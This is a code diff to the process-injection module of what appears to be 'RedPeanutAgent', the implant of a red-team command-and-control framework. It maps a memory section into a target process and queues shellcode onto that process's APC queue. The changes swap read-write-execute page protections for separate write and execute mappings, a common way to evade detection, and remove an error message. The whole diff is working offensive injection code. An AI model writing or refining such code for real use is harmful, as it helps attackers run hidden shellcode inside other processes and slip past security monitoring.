@@ -161,7 +161,7 @@ namespace RedPeanutAgent.Execution
             //Map section to current process
             IntPtr baseAddr = IntPtr.Zero;
             IntPtr viewSize = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Natives.PAGE_EXECUTE_READWRITE);
+            InjectionHelper.MapViewOfSection(section, Natives.GetCurrentProcess(), ref baseAddr, ref viewSize, Natives.PAGE_READWRITE);
             if (baseAddr == IntPtr.Zero)
             {
                 return false;
@@ -173,7 +173,7 @@ namespace RedPeanutAgent.Execution
             //Map remote section
             IntPtr baseAddrEx = IntPtr.Zero;
             IntPtr viewSizeEx = (IntPtr)size;
-            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Natives.PAGE_EXECUTE_READWRITE);
+            InjectionHelper.MapViewOfSection(section, procInfo.hProcess, ref baseAddrEx, ref viewSizeEx, Natives.PAGE_EXECUTE);
             if (baseAddrEx == IntPtr.Zero || viewSizeEx == IntPtr.Zero)
             {
                 return false;
@@ -184,7 +184,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            // Assign address of shellcode to the target thread apc queue
+            // Assign address of shellcode to the target apc queue
             if (!InjectionHelper.QueueApcThread(baseAddrEx, procInfo))
             {
                 return false;
@@ -244,7 +244,6 @@ namespace RedPeanutAgent.Execution
 
             if (Natives.ZwMapViewOfSection(section, hprocess, ref baseAddr, IntPtr.Zero, IntPtr.Zero, soffset, ref viewSize, 1, 0, protect) != 0)
             {
-                Console.WriteLine("Error mapping section remote " + Core.Natives.GetLastError());
                 return false;
             }
             return true;
